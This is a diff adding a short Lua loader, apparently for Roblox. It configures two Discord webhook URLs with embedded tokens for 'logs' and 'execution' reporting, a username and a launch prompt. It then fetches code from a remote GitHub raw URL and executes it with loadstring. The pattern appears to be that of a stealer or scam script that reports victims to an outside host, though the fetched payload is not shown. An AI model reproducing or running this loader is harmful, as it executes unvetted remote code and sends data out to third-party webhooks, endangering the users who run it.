@@ -1,0 +1,7 @@
+LogsWebhook = "https://discord.com/api/webhooks/1334454491864629279/mREWDZBTyWAhqu6S0FkphYUSsU52dzNPHUyOydU7YWv8ThClRKYl23bpdMC-86dgQ6eR"
+ExecutionWebhook = "https://discord.com/api/webhooks/1334454545387880478/1jdd8YyqjIEpH1T5lekSkE5O8ZYhEEd5fQJ_u3qN6b4uCyHgm6dxZdH7KmPVwFIBmDZ4" 
+Username = "2TFxB6xXxDyaHPupE"
+PromptText = "Launch Script."
+RandomizedPrompt = false
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrubGrub2/coding/refs/heads/main/Script"))() 
